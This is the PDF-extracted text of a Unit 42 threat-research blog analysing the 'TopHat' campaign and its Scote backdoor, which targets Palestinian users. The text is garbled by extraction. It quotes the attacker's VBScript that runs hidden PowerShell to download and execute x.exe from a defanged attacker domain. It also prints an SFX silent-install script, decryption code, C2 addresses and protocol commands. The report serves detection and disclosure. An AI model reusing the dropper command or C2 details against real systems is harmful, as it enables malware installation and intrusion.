{
    "title": "The TopHat Campaign - Attacks Within The Middle East Region Using Popular Third-Party Services",
    "text": "01/04/24, 21:19The TopHat Campaign: Attacks Within The Middle East Region Using Popular Third-Party Services Pagina 1 di 16https://unit42.paloaltonetworks.com/unit42-the-tophat-campaign-att…-within-the-middle-east-region-using-popular-third-party-services/The T opHat Campaign: A!acks Within TheMiddle East Region Using Popular Third-PartyServices62,414people reacted114 min. read SummaryIn recent months, Palo Alto Networks Unit 42 observed a wave of a!acks leveraging popular third-party servicesGoogle+, Pastebin, and bit.ly. A!ackers used Arabic language decoy documents related to current events withinthe Pales\"ne Territories as lures to en\"ce vic\"ms to open and subsequently be infected by the malware. There isdata indica\"ng that these a!acks are targe\"ng individuals or organiza\"ons within the Pales\"nian Territories, whichis detailed later.The a!acks themselves are deployed via four diﬀerent means, two involving malicious RTF ﬁles, one involving self-extrac\"ng Windows executables, and the ﬁnal using RAR archives.The ul\"mate payload is a new malware family that we have dubbed “Scote” based on strings we found within themalware samples. Scote provides backdoor access for an a!acker and we have observed it collec\"ng commandand control (C2) informa\"on from Pastebin links as well as Google+ proﬁles. The bit.ly links obscured the C2 URLsso vic\"ms could not evaluate the legi\"macy of the ﬁnal site prior to clicking it. We are calling their recent ac\"vitythe “TopHat” campaign.Addi\"onally, we tracked the apparent author tes\"ng their malware against numerous security products. Ourtracking of this tes\"ng enabled us to both note changes made over \"me as well as to observe other malware beingsubmi!ed by the author. This other malware submi!ed provided overlaps with the previously reported DustySkycampaign. In addi\"on to tes\"ng malicious RTFs that deploy the Scote malware family, the same a!acker waswitnessed submi$ng ﬁles that appear to be new variants of the DustySky Core malware discussed in their report.By Josh GrunzweigJanuary 26, 2018 at 5:00 AMCategory: Unit 42Tags: Core, DustySky, Pales\"nian Territories, Scote, TopHatSHARE  Under Attack?About Unit 42ServicesUnit 42 Threat ResearchPartnersResources01/04/24, 21:19The TopHat Campaign: Attacks Within The Middle East Region Using Popular Third-Party Services Pagina 2 di 16https://unit42.paloaltonetworks.com/unit42-the-tophat-campaign-att…-within-the-middle-east-region-using-popular-third-party-services/Malware Delivery TechniquesThe a!acks we found within the TopHat campaign began in early September 2017. In a few instances, originalﬁlenames of the iden\"ﬁed samples were wri!en in Arabic. Speciﬁcally, we found the following names during thisinves\"ga\"on: Original FilenameTransla!onالسلطة بحل يبدا الرئيس.rarThe president begins dissolving power.rarالسلطة بحل يبدا الرئيس.scrThe president begins dissolving power.scrاليوم اجتماع محضر.docMinutes of today's mee\"ng.doc We observed a series of techniques used to deploy the Scote malware family. To date, at a high level, we haveobserved the following four techniques, each of which we delve into in this blog: Figure 1 Malware delivery techniquesTechnique #1 – RTFs Leveraging Bit.lyThe ﬁrst technique encountered included the use of malicious RTFs that made a HTTP request to the below URLwhich then redirected to the below malicious site (note the inten\"onal typo of “storage”): URLRedirecth!p:/ /bit[.]ly/2y3XL3Ph!p:/ /storgemydata[.]website/v.dat01/04/24, 21:19The TopHat Campaign: Attacks Within The Middle East Region Using Popular Third-Party Services Pagina 3 di 16https://unit42.paloaltonetworks.com/unit42-the-tophat-campaign-att…-within-the-middle-east-region-using-popular-third-party-services/ This ‘v.dat’ ﬁle was in turn a PE32 executable ﬁle that has the following SHA256 hash:SHA256862a9836450a0988bc0f5bd5042392d12d983197f40654c44617a03ﬀ5f2e1d5 Looking at the publicly available sta\"s\"cs for the bit[.]ly redirect, we see the majority of ac\"vity taking place in lateOctober of this year. Addi\"onally, we see the majority of the downloads origina\"ng from both the Pales\"nianTerritories as well as the United Arab Emirates. This provides clues as to who the vic\"ms are or where a!ackersmay originate from.  Figure 2 Sta!s!cs surrounding malicious redirect Technique #2 – Don’t Kill My Cat A!acksThe second technique uses an interes\"ng tac\"c that Unit 42 has not seen before. Speciﬁcally, it makes use of ana!ack discussed in July of this year called Don’t Kill My Cat or DKMC. DKMC can enable an a!acker to load alegi\"mate bitmap (BMP) ﬁle that contains shellcode within it. The DKMC tool and more informa\"on about thistac\"c may be found here.This speciﬁc a!ack begins with a malicious executable ﬁle that downloads a legi\"mate BMP ﬁle that looks like thefollowing: 01/04/24, 21:19The TopHat Campaign: Attacks Within The Middle East Region Using Popular Third-Party Services Pagina 4 di 16https://unit42.paloaltonetworks.com/unit42-the-tophat-campaign-att…-within-the-middle-east-region-using-popular-third-party-services/ Figure 3 Malicious BMP image retrieved by downloaderIt should be noted that this is the same image used in the DKMC presenta\"on. It would appear that the a!ackerssimply used the default se$ngs of this par\"cular program.This BMP ﬁle is loaded as shellcode. The ﬁrst six bytes are read as the following instruc\"ons:Code execu\"on is then redirected to embedded shellcode.The underlying shellcode is decrypted at run\"me using a 4-byte XOR key of 0x3C0922F0. The shellcodeeventually loads an embedded UPX-packed executable and redirects execu\"on to this ﬁle. This ﬁle is an instanceof the Scote malware family. The size of the payload and the fact that it is embedded within the BMP ﬁle explainsthe large amount of distor\"on witnessed in the image above. In other words, the distor\"on witnessed is actuallythe shellcode and the embedded Scote malware. As this data is converted within a BMP image, we’re le% withwhat essen\"ally looks like random pixels.Technique #3 – RTFs Exploi\"ng CVE-2017-0199.This technique begins with malicious RTF ﬁles that make use of CVE-2017-0199 a Microso% Oﬃce/WordPadremote code execu\"on (RCE) vulnerability patched by Microso% in September 2017. When opened, the followinglure is displayed to the vic\"m (transla\"on on the right provided by Google Translate): Figure 4 Lure used by malicious RTFsThis lure is related to an event reported in late August where President Mahmoud Abbas announced plans to123seg000:00000000                 inc     edxseg000:00000001                 dec     ebpseg000:00000002                 jmp     loc_34D8B01/04/24, 21:19The TopHat Campaign: Attacks Within The Middle East Region Using Popular Third-Party Services Pagina 5 di 16https://unit42.paloaltonetworks.com/unit42-the-tophat-campaign-att…-within-the-middle-east-region-using-popular-third-party-services/convert a planned presiden\"al palace into a na\"onal library. This is consistent with the \"meline of the a!acks wewitnessed, as the event took place roughly a week before we observed these malware samples.These RTFs will also download a ﬁle from the following loca\"on:storgemydata[.]website/update-online/oﬃce-update.r'Note that this is the same domain witnessed in the redirect used in technique #1. While the downloaded ﬁle hasan RTF extension, it is in fact a VBScript with the following contents: This VBScript script executes a PowerShell command that will download and execute a ﬁle from the followingloca\"on:h!p:/ /storgemydata[.]website/x.exeThis ﬁnal ‘x.exe’ executable ﬁle is an instance of the Scote malware family.Technique #4 – Self-extrac\"ng ExecutablesThe last technique makes use of self-extrac\"ng executable ﬁles to both load a decoy document and spawn aninstance of Scote. When the malware is run it will drop a ﬁle with an original ﬁlename of ‘abbas.r'’, which containsthe following contents: Figure 5 TopHat decoy document with rough transla!onAddi\"onally, an instance of Scote is loaded on the vic\"m machine.The decoy document used discusses the poten\"al dissolving of the Pales\"nian Authority (PA) by the PresidentMahmoud Abbas. This par\"cular event was reported on August 23, 2017, just before Trump administra\"on123456789<script language=\"VBScript\">window.moveTo -4000, -4000  Set vFwhEtGt = CreateObject(\"Wscript.Shell\")  Set lfTi = CreateObject(\"Scripting.FileSystemObject\")  If 1=1 Then    vFwhEtGt.Run (\"PowerShell.exe -WindowStyle Hidden $d=$env:userprofile+'\\\\start Menu\\\\Programs\\\\Startup\\\\\\12330718701ac441736a55e3ee3cx996.exe';(New-Object System.Net.WebClient).DownloadFile('http://storgemydata[.]website/x.exe',$d);Start-Process $d;\"),0 End If  window.close()</script>01/04/24, 21:19The TopHat Campaign: Attacks Within The Middle East Region Using Popular Third-Party Services Pagina 6 di 16https://unit42.paloaltonetworks.com/unit42-the-tophat-campaign-att…-within-the-middle-east-region-using-popular-third-party-services/oﬃcials were set to visit Ramallah.Later in this blog, we will see the a!ackers leveraging this Donald Trump connec\"on even more.We originally witnessed these speciﬁc RTFs on September 6, 2017, just two weeks a%er this event.Based on the observed sta\"s\"cs from the malicious redirect found in technique #1, as well as the content of thisdecoy document, we can infer that at least some of the targeted vic\"ms may very well be located in thePales\"nian Territories.Analysis of the Scote MalwareThe Scote malware family employs a series of techniques and tricks when it is originally loaded onto a vic\"mmachine. However, underneath the various layers of obfusca\"on lies a fairly straigh'orward malware family thatabuses legi\"mate third-party online services to host its C2 informa\"on.When Scote originally is run, it will decode embedded conﬁgura\"on informa\"on. This embedded conﬁgura\"oninforma\"on contains URLs to third party online services, such as Pastebin pos\"ngs or Google+ accounts. Scote willuse this informa\"on to a!empt to retrieve data from these URLS and parse it, such as in the following example: Figure 6 Google+ proﬁle used by Scote malwareIt should be noted that a total of three Google+ proﬁles have been observed and all of these proﬁles contained thename ‘Donald Trump’. This is interes\"ng given the topics we saw being used to deliver the Scote malware familywithin the TopHat campaign, many of which also referred to the President of the Pales\"nian Territories.A%er C2 informa\"on is retrieved by Scote, it will communicate with these servers and can accept commands thatperform the following ac\"ons:Kill the Scote malwareRun ‘ipconﬁg’ on the vic\"m and return resultsRun ‘cmd.exe /C systeminfo’ and return resultsLoad a DLL that is downloaded from a C2For more informa\"on about the Scote malware family, please refer to the Appendix.Iden\"ﬁed Malware Tes\"ng Against Security Solu\"onsWhen looking at the malicious RTF documents in technique #4 that exploit CVE-2017-0199 we found that all ofthe ﬁles we encountered were submi!ed within close succession of each other to an online service that teststhem against mul\"ple security products. Addi\"onally, the original ﬁlenames of these ﬁles implied that an a!ackerth01/04/24, 21:19The TopHat Campaign: Attacks Within The Middle East Region Using Popular Third-Party Services Pagina 7 di 16https://unit42.paloaltonetworks.com/unit42-the-tophat-campaign-att…-within-the-middle-east-region-using-popular-third-party-services/may have been tes\"ng their malware against one or more security products.SHA256FilenameDatecb6cf34853351ba62d4dd2c609d6a41c618881670d5652ﬀa7ddf5496e4693f0test1.r'2017-09-0615:00:08 UTC8a158271521861e6362ee39710ac833c937ecf2d5cbf4065cb44f3232224cf64xx.r'2017-09-0615:00:53 UTCd302f794d45c2a6eaaf58ade70a9044e28bc9ec43c9f7a1088a606684b1364b5xx2.r'2017-09-0615:01:49 UTC1cd49a82243eacdd08eee6727375c1ab83e8ecca0e5ab7954c681038e8dd65a1xx2.r'2017-09-0615:05:30 UTCd409d26cﬀe6ce5298956bd65fd604edf9cfa14bc3373a7bdeb47091729f09e9xx2.r'2017-09-0615:08:32 UTCaa18b8175f68e8eefa12cd2033368bc1b73ﬀ7caf05b405f6ﬀ1e09ef812803cxx2.r'2017-09-0615:18:14 UTC As we can see by the \"mestamps shown above, the ﬁles were submi!ed anywhere from one to ten minutes apartfrom each other. Looking closer at these ﬁles we can see what changed between itera\"ons. 01/04/24, 21:19The TopHat Campaign: Attacks Within The Middle East Region Using Popular Third-Party Services Pagina 8 di 16https://unit42.paloaltonetworks.com/unit42-the-tophat-campaign-att…-within-the-middle-east-region-using-popular-third-party-services/ Figure 7 Modiﬁca!ons made to RTFs by a\"ackerAs it so happens, the ﬁrst RTF ﬁle this a!acker a!empted to test had very few detec\"ons. However, this was dueto the fact that the a!empts at commen\"ng out the backslashes caused this ﬁle to not open at all withinMicroso% Word. When you a!empt to open this ﬁle, Word will simply render the content as it would a normal textﬁle.It appeared that the a!acker realized this, as he or she quickly corrected this, and proceeded to make very minormodiﬁca\"ons to try and evade security products. However, none of the modiﬁca\"ons were terribly eﬀec\"ve: all ofthese samples were found to have a high rate of detec\"on.As we can see in Figure 7, the a!acker made mul\"ple very small modiﬁca\"ons between each itera\"on, speciﬁcallyaround the ‘\\object\\objlink\\objupdate’ string. This par\"cular control allows the malicious content to be loaded bythe RTF, as outlined in an analysis by MDSec. As such, the a!acker likely felt this was what resulted in the RTFbeing detected as malicious, and a!empted to obfuscated it.Overlap with the DustySky CampaignBesides being able to witness the a!acker tes\"ng his or her malware, we no\"ced something interes\"ng when wewere looking at the individual who submi!ed these ﬁles. About a month and a half a%er these ﬁles weresubmi!ed, the same individual submi!ed the following three samples that we a!ribute to the DustySky campaign:202d1d51254eb13c64d143c387a87c5e7ce97ba3dcfd12dd202a640439a9ea3bd18e09debde4748163efa25817b197f3ﬀ0414d2255f401b625067669e8e571e3e4d0ﬀdde0b5db2a0a526730ﬀ63908cefc9634f07ec027c478c123912554bbDustySky is a campaign published by ClearSky in January 2016 that discusses a poli\"cally mo\"vated group thatprimarily targets organiza\"ons within the Middle East. The group has remained ac\"ve since they were originallyreported on, including a campaign iden\"ﬁed by Unit 42 earlier this year. These ﬁles appear to be new variants ofthe DustySky Core malware discussed in the report and they communicate with the following domains over01/04/24, 21:19The TopHat Campaign: Attacks Within The Middle East Region Using Popular Third-Party Services Pagina 9 di 16https://unit42.paloaltonetworks.com/unit42-the-tophat-campaign-att…-within-the-middle-east-region-using-popular-third-party-services/HTTPS:fulltext.yourtrap[.]comchecktest.www1[.]bizThe malware is dropped via a self-extrac\"ng executable, which contains an empty decoy document with thefollowing name::لفلسط رئيسا دح>ن واع>ن السعودية في عباس الرئيس احتجاز عن انباء.docxThis can roughly be translated to the following:News of the deten\"on of President Abbas in Saudi Arabia and Dahlan's declara\"on as President ofPales\"ne.docxAs we can see, the name of this decoy document is consistent with the lures witnessed in the TopHat campaign.ConclusionA!ackers o%en are found to leverage current events to accomplish their goal. In the TopHat campaign, we haveobserved yet another instance where a threat actor looks to be using poli\"cal events to target individuals ororganiza\"ons within the Pales\"ne region. This campaign leveraged mul\"ple methods to deploy a previouslyunseen malware family, including some rela\"vely new tac\"cs in the case of using a legi\"mate BMP ﬁle to loadmalicious shellcode.The new malware family, which we have dubbed Scote, employs various tricks and tac\"cs to evade detec\"on, butprovides rela\"vely li!le func\"onality to the a!ackers once deployed. This may well be due to the fact it is s\"llunder ac\"ve development. Scote uses some interes\"ng methods when retrieving C2 informa\"on, including theuse of Pastebin and Google+ accounts, as well as using bit.ly links to obscure the C2 URLs so vic\"ms could notevaluate the legi\"macy of the ﬁnal site prior to clicking it.The TopHat campaign was found to have some overlaps discovered with the previously reported DustySkycampaign when the a!acker was iden\"ﬁed to be submi$ng their ﬁles for tes\"ng purposes. Unit 42 will con\"nueto track and monitor this threat and will report on any developments that occur.Palo Alto Networks customers are protected by this threat in the following ways:The Scote malware family and the TopHat campaign have been tagged within AutoFocus for con\"nued trackingDustySky is tagged within AutoFocus for ongoing trackingAll malicious domains discovered within this campaign have been appropriately ﬂagged as malwareAll samples are marked malicious within WildFireTraps iden\"ﬁes and blocks the exploits used by the RTF ﬁlesAddi\"onally, Google, Pastebin, and bit.ly have been no\"ﬁed of the malicious content being hosted on theirservices.Appendix01/04/24, 21:19The TopHat Campaign: Attacks Within The Middle East Region Using Popular Third-Party Services Pagina 10 di 16https://unit42.paloaltonetworks.com/unit42-the-tophat-campaign-att…within-the-middle-east-region-using-popular-third-party-services/Indicators of CompromiseSHA256 Hashesd3ead67228b3d7968ac767648b46a8e906affa0ebb5cc69f7acbed475a97204c03e2b932c013252fa2eb5e35390f9e21d0ff87e5b1c01683ebce0e8ce9b8d6df4df9488fbdfaf5d05fda65175a6b6e5331c58c967adbe972aa46c64b4fd0b1bb0dde9940f7896c2e4fb881dd185c3c3db280a9fd2ac2cb81988f43f5b0f6fcf7613da5f745c281acbffa4375e96394f8c912f58f92afe347e8a1f10fad3489bbd0f2d2d7d82c91fe64a64552e0e6200a096230fb6a64a1307928ae33ab2a5bf87b6347093b27174e27228c2fde7d39e02d57315b354461aaf1dee3f0800fdfc3bdc633fe3145d87036ad759be855771d5bb3ca592cecca9ef7f41454d7cf9f05ed9c62f77055a2498aec681b5653240be534595b97a9d11e92371639b0ca9a487a1fa34ca804492415579c3ed4f505a7f09fcd7bc834590cff86e2ce77c4fc73862a9836450a0988bc0f5bd5042392d12d983197f40654c44617a03ff5f2e1d53540c2f0765773fa0a822fcf5fed5ed2a363ad11291a66ab1b488c9a4aa857f9ddc13c8d3d55562df873d4cf17181164922cb71d0c94edeb8fa143033c1214e0d4cb6b76dd352c928ca7184f583d14d800c090ba650dd26d8fa4febe901d12055c0b253966befd57f4d22548f01116ffa367d027f162514c1b043a747bead5961f9bca1d5ce5d14d478d32f105b3ab5d15e1c520bde5dfca22324262e84d4eafc9ba9e11a19120b58af1f6ccf3beb25744580592c680718a6fc205d662f2a20eaa18b8175f68e8eefa12cd2033368bc1b73ff7caf05b405f6ff1e09ef812803cd409d26cffe6ce5298956bd65fd604edf9cfa14bc3373a7bdeb47091729f09e9d302f794d45c2a6eaaf58ade70a9044e28bc9ec43c9f7a1088a606684b1364b51cd49a82243eacdd08eee6727375c1ab83e8ecca0e5ab7954c681038e8dd65a18a158271521861e6362ee39710ac833c937ecf2d5cbf4065cb44f3232224cf643627ed71588c7b55b35592c3b277910041f3d5ff917de721c53684ee18fcda40109996d28700fa0e8594d6ecca422418fa43e1b7cf5f9f4442a69264bf5fcea4c2815c72c9ea70db073775269ef04b1d061e93580f0f5fd3f3de25601641576aDomainsstorgemydata[.]website Scote Technical AnalysisFor the technical analysis, we used the following sample:SHA2563540c2f0765773fa0a822fcf5fed5ed2a363ad11291a66ab1b488c9a4aa857f9 This par\"cular sample begins as a self-extrac\"ng executable. When run, it will drop a ‘e.exe’ sample and executethe following SFX script commands: For those unfamiliar with SFX commands, the series of commands above is silently deploying e.exe to the startuppath. It will overwrite any instances where e.exe already exists in this path.The ‘e.exe’ ﬁle is compiled in Delphi and has the following SHA256 hash:12345Path=%userprofile%\\start menu\\programs\\startup\\Setup=e.exeSilent=1Overwrite=1Update=U01/04/24, 21:19The TopHat Campaign: Attacks Within The Middle East Region Using Popular Third-Party Services Pagina 11 di 16https://unit42.paloaltonetworks.com/unit42-the-tophat-campaign-att…within-the-middle-east-region-using-popular-third-party-services/SHA2569580d15a06cd59c01c59bca81fa0ca8229f410b264a38538453f7d97b(315e7 When run, ‘e.exe’ will periodically decrypt strings at run\"me using a simple single-byte XOR rou\"ne. While therou\"ne allows for diﬀerent bytes to be used, the author chose to use a key of 0xFF in every observed instance.The malware proceeds to get the address of the NtDelayExecu\"on func\"on from ntdll.dll. This func\"on is used bySleep to cause a delay in program execu\"on. A%er this func\"on address has been resolved, it will overwrite theﬁrst ﬁve bytes to jmp to a malicious func\"on, as seen below: Figure 8 Modiﬁca!ons to NtDelayExeuc!on The malware proceeds to make a call to Sleep with an argument of 1, thus redirec\"ng execu\"on to this maliciousfunc\"on. This is likely an a!empt at thwar\"ng an\"-virus and security solu\"ons, however, has the adverse eﬀect ofpreven\"ng the malware from making subsequent calls to Sleep.This malicious func\"on con\"nues to decode more strings using the single-byte XOR technique. Addi\"onally, it willcopy the following func\"ons out of ntdll.dll for later use:ZwCreateUserProcessZwAllocateVirtualMemoryZwWriteVirtualMemoryZwGetContextThreadZwSetContextThreadZwResumeThreadA large blob of encrypted data is decrypted using a modiﬁed version of RC4. The following Python code may beused to decrypt this data. The key has consistently been observed to be “qlNwuFVA9K8HpGNY6x0I”.123456789101112131415161718192021import base64import binasciiimport hexdumpimport sysdef rc4_crypt(data, key):  S = range(256)  j = 0  out = []  for i in range(256):    j = (j + S[i] + ord( key[i % len(key)] )) % 256    S[i] , S[j] = S[j] , S[i]  i = 0  for char in data:    j = (S[i % 256] + j) % 256    t = S[i%256]    S[i%256] = S[j]    S[j] = t    out.append(chr(ord(char) ^ S[(S[i%256] + S[j]) % 256]))    i += 1  return ''.join(out)file = sys.argv[1]01/04/24, 21:19The TopHat Campaign: Attacks Within The Middle East Region Using Popular Third-Party Services Pagina 12 di 16https://unit42.paloaltonetworks.com/unit42-the-tophat-campaign-att…within-the-middle-east-region-using-popular-third-party-services/ This decrypted code is then copied to a newly allocated block of memory before execu\"on ﬂow is redirected to it.When this newly decrypted code is called, it is provided with a string argument containing the path to svchost.exe.This new code is shellcode that will eventually decrypt an executable ﬁle and inject it into a newly spawnedsvchost.exe process.The shellcode in ques\"on makes certain decisions by the author that demonstrates a lack of sophis\"ca\"on. Forexample, it will load a series of libraries and func\"ons using a common ROR13 technique. This technique beginswith the a!acker taking a string of a library or func\"on, such as ‘CreateProcessA’, and performing a binary ROR13against it. In this example, the a!acker has a result of a DWORD of 0x16B3FE72. This DWORD is then typicallyhardcoded within the shellcode. The malicious code then iterates through the func\"ons of the necessary libraryand applies the same ROR13 technique against each func\"on un\"l it ﬁnds a match.This shellcode uses the same approach, however, instead of providing the hardcoded DWORDs, it insteadprovides the clear-text library and func\"on names, which then have the ROR13 applied. The resul\"ng DWORD isthen used. Unfortunately, this completely cancels out any obfusca\"on that might have originally been present.A%er the various libraries and func\"ons are loaded, the shellcode decodes an embedded blob of data using amul\"-byte XOR opera\"on. The original key for this opera\"on appears to have been ‘Houdini’, however, due to alikely mistake by the author, a%er the ﬁrst itera\"on, a key of ‘oudini\\x00’ is used instead.The following example Python code decodes this data found within the shellcode:  This decoded blob is a Microso% Windows executable that contains the Scote payload. A%er this blob is decoded,a new instance of svchost.exe is spawned in a suspended state. The Scote payload is injected into this processprior to resuming it.Scote begins by loading and decoding an embedded resource string. It is decoded ﬁrst using base64 with acustomized alphabet. The result is then base64-decoded using the tradi\"onal alphabet. The following alphabet isused for the ﬁrst phase of decoding:0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/Once decoded, we’re provided with the following conﬁgura\"on (newlines and spacing added for presenta\"on):22232425262728f = open(file, 'rb')fd = f.read()f.close()output = rc4_crypt(fd, \"qlNwuFVA9K8HpGNY6x0I\")f = open(\"decrypted_data.bin\",'wb')f.write(output)f.close() 1234567891011121314151617181920212223import sysfrom itertools import cycle, izipdef xor(message, key):  return ''.join(chr(ord(c)^ord(k)) for c,k in izip(message, cycle(key)))def decode(data, size):  out = \"\"  key = \"oudini\\x00\"  b1 = xor(data[0], \"H\")  b2 = xor(data[1:size], key)  b = b1 + b2  for bite in b:    out += chr((ord(bite) + 128) & 0xff)  return outfile = sys.argv[1]f = open(file, 'rb')fd = f.read()f.close()size = 54272output = decode(fd, size)f1 = \"embeddedShellcode.bin\"fh = open(f1, 'wb')fh.write(output)fh.close() 12[config]  [connection]01/04/24, 21:19The TopHat Campaign: Attacks Within The Middle East Region Using Popular Third-Party Services Pagina 13 di 16https://unit42.paloaltonetworks.com/unit42-the-tophat-campaign-att…within-the-middle-east-region-using-popular-third-party-services/ The conﬁgura\"on is parsed to determine if there are any connec\"on ‘param’ parameters provided. In the eventthat there are, Scote will a!empt to download the contents of these URLs via a simple GET request.These pastebin URLs contained the following informa\"on, IPs have been defanged:  In addi\"on to Pastebin, some samples were found connec\"ng to the following three Google+ proﬁles:h!ps:/ /plus.google[.]com/104518099222750189969h!ps:/ /plus.google[.]com/110228699051788231047h!ps:/ /plus.google[.]com/106456556287604120942Scote takes the response from these requests and parses data within ‘scout{}’. Other Scote versions a!empted toiden\"fy data contained within ‘{x=’ and ‘}’. This data is decoded using the tradi\"onal Base64 algorithm. The resultsare similar to the following (IPs have been defanged):  This informa\"on is used for subsequent communica\"on and these values represent the Scote malware’s C2.While there are a number of other conﬁgura\"on parameters within Scote, the connec\"on params and thenick_name appear to be the only ones used. It’s possible that Scote is s\"ll ac\"vely being developed and the authorhas yet to make use of the addi\"onal parameters provided within the conﬁgura\"on. A full list of iden\"ﬁed Scoteconﬁgura\"ons may be found within the ‘Scote Conﬁgura\"ons’ appendix.Scote checks the current running process against the following list to ensure it is running within one of them:svchost.exe345678910111213    [param]http://pastebin[.]com/raw/2cLsuXj6[/param]    [param]http://pastebin[.]com/raw/trZZJTGA[/param]  [/connection]  [install_name]e3HGAiPJ[/install_name]  [nick_name]4c1h7vLX[/nick_name]  [install_folder]noinstall[/install_folder]  [reg_startup]false[/reg_startup]  [folder_startup]false[/folder_startup]  [task_startup]false[/task_startup]  [injection]true[/injection]  [injection_process]svchost[/injection_process] 1234567891011121314151617scout{5.175.214[.]9:225.175.214[.]9:235.175.214[.]9:255.175.214[.]9:535.175.214[.]9:60005.175.214[.]9:80}elite{5.175.214[.]9:50005.175.214[.]9:4435.175.214[.]9:14345.175.214[.]9:1105.175.214[.]9:27165.175.214[.]9:8080}{x=c2NvdXR7DQo1LjE3NS4yMTQuOToyMg0KNS4xNzUuMjE0Ljk6MjMNCn0NCmVsaXRlew0KNS4xNzUuMjE0Ljk6NTAwMA0KNS4xNzUuMjE0Ljk6NDQzDQp9} 12345678scout{5.175.214[.]9:225.175.214[.]9:23}elite{5.175.214[.]9:50005.175.214[.]9:443}01/04/24, 21:19The TopHat Campaign: Attacks Within The Middle East Region Using Popular Third-Party Services Pagina 14 di 16https://unit42.paloaltonetworks.com/unit42-the-tophat-campaign-att…within-the-middle-east-region-using-popular-third-party-services/explorer.exechrome.exeﬁrefox.exeiexplorer.exeopera.exeScote makes an ASM call to CPUID with an argument of 1 to query the vic\"m’s processor informa\"on andfeatures. This informa\"on is used to generate a unique 8-character hash for that vic\"m.Scote then connects to the previously retrieved C2 servers and sends the following informa\"on via TCP:command=scote_connection|hwid=[8 character hash]In the example above, [8 character hash] is replaced with the vic\"m’s unique hash. Scote con\"nues to submit thefollowing command periodically and will parse the response:command=scote_pingScote accepts the following ﬁve responses:CommandDescrip!onscote_pongNo ac\"on taken by Scotescote_dropKill the Scote malwarescote_info_ipconﬁgReturn the results of running ‘ipconﬁg’scote_info_systeminfoReturn the results of running ‘cmd.exe /C systeminfo’scote_upgradeAccept a DLL from the remote C2 and load it. When Scote returns informa\"on in the following format:command=[command]|buffer=[data]In the example above, [command] is replaced with the command received by the remote C2 server, and [data] isreplaced with data that has been encoded using both tradi\"onal base64 as well as base64 with the nonstandardalphabet.Scote Conﬁgura\"ons123456789101112131415161718192021222324254df9488fbdfaf5d05fda65175a6b6e5331c58c967adbe972aa46c64b4fd0b1bb[config]  [connection]    [param]https://plus.google[.]com/104518099222750189969[/param]    [param]https://plus.google[.]com/110228699051788231047[/param]    [param]https://plus.google[.]com/106456556287604120942[/param]  [/connection]  [install_name]Kh237t0P[/install_name]  [nick_name]k1et333d[/nick_name]  [install_folder]noinstall[/install_folder]  [reg_startup]false[/reg_startup]  [folder_startup]false[/folder_startup]  [task_startup]false[/task_startup]  [injection]true[/injection]  [injection_process]svchost[/injection_process]ed9c62f77055a2498aec681b5653240be534595b97a9d11e92371639b0ca9a48[config]  [connection]    [param]https://plus.google[.]com/104518099222750189969[/param]    [param]https://plus.google[.]com/110228699051788231047[/param]    [param]https://plus.google[.]com/106456556287604120942[/param]  [/connection]  [install_name]Q2xm5ziY[/install_name]  [nick_name]hq5GyQ1D[/nick_name]  [install_folder]noinstall[/install_folder]01/04/24, 21:19The TopHat Campaign: Attacks Within The Middle East Region Using Popular Third-Party Services Pagina 15 di 16https://unit42.paloaltonetworks.com/unit42-the-tophat-campaign-att…within-the-middle-east-region-using-popular-third-party-services/  262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697  [reg_startup]false[/reg_startup]  [folder_startup]false[/folder_startup  [task_startup]false[/task_startup]  [injection]false[/injection]613da5f745c281acbffa4375e96394f8c912f58f92afe347e8a1f10fad3489bb[config]  [connection]    [param]http://pastebin[.]com/raw/2cLsuXj6[/param]    [param]http://pastebin[.]com/raw/trZZJTGA[/param]  [/connection]  [install_name]e3HGAiPJ[/install_name]  [nick_name]4c1h7vLX[/nick_name]  [install_folder]noinstall[/install_folder]  [reg_startup]false[/reg_startup]  [folder_startup]false[/folder_startup]  [task_startup]false[/task_startup]  [injection]true[/injection]  [injection_process]svchost[/injection_process]03e2b932c013252fa2eb5e35390f9e21d0ff87e5b1c01683ebce0e8ce9b8d6df[config]  [connection]    [param]http://pastebin[.]com/raw/2cLsuXj6[/param]    [param]http://pastebin[.]com/raw/trZZJTGA[/param]  [/connection]  [install_name]i0c9488I[/install_name]  [nick_name]7WDyDSog[/nick_name]  [install_folder]noinstall[/install_folder]  [reg_startup]false[/reg_startup]  [folder_startup]false[/folder_startup]  [task_startup]false[/task_startup]  [injection]true[/injection]  [injection_process]svchost[/injection_process]0dde9940f7896c2e4fb881dd185c3c3db280a9fd2ac2cb81988f43f5b0f6fcf7[config]  [connection]    [param]http://pastebin[.]com/raw/2cLsuXj6[/param]    [param]http://pastebin[.]com/raw/trZZJTGA[/param]  [/connection]  [install_name]ZVLhWo62[/install_name]  [nick_name]b04bc9mK[/nick_name]  [install_folder]noinstall[/install_folder]  [reg_startup]false[/reg_startup]  [folder_startup]false[/folder_startup]  [task_startup]false[/task_startup]  [injection]true[/injection]  [injection_process]svchost[/injection_process]d0f2d2d7d82c91fe64a64552e0e6200a096230fb6a64a1307928ae33ab2a5bf8[config]  [connection]    [param]http://pastebin[.]com/raw/2cLsuXj6[/param]  [/connection]  [install_name]9OhcOo03[/install_name]  [nick_name]URt7b1zK[/nick_name]  [install_folder]temp[/install_folder]  [reg_startup]false[/reg_startup]  [folder_startup]false[/folder_startup]  [task_startup]true[/task_startup]  [injection]true[/injection]  [injection_process]svchost[/injection_process]7b6347093b27174e27228c2fde7d39e02d57315b354461aaf1dee3f0800fdfc3[config]  [connection]    [param]http://pastebin[.]com/raw/2cLsuXj6[/param]  [/connection]  [install_name]ke6Wox2L[/install_name]  [nick_name]3GlWhgi3[/nick_name]  [install_folder]noinstall[/install_folder]  [reg_startup]false[/reg_startup]  [folder_startup]true[/folder_startup]  [task_startup]false[/task_startup]  [injection]true[/injection]  [injection_process]explorer[/injection_process]01/04/24, 21:19The TopHat Campaign: Attacks Within The Middle East Region Using Popular Third-Party Services Pagina 16 di 16https://unit42.paloaltonetworks.com/unit42-the-tophat-campaign-att…within-the-middle-east-region-using-popular-third-party-services/Get updates from Palo Alto Networks!Sign up to receive the latest news, cyber threat intelligence and research from usEmail addressSubscribe reCAPTCHANon sono un robotPrivacy - TerminiBy submi$ng this form, you agree to our Terms of Use and acknowledgeour Privacy Statement.   2024 Palo Alto Networks, Inc. All rights reserved.Popular ResourcesResource CenterBlogCommuni\"esTech DocsUnit 42SitemapLegal NoticesPrivacyTerms of UseDocumentsAccountManage Subscrip\"onsReport a Vulnerability"
}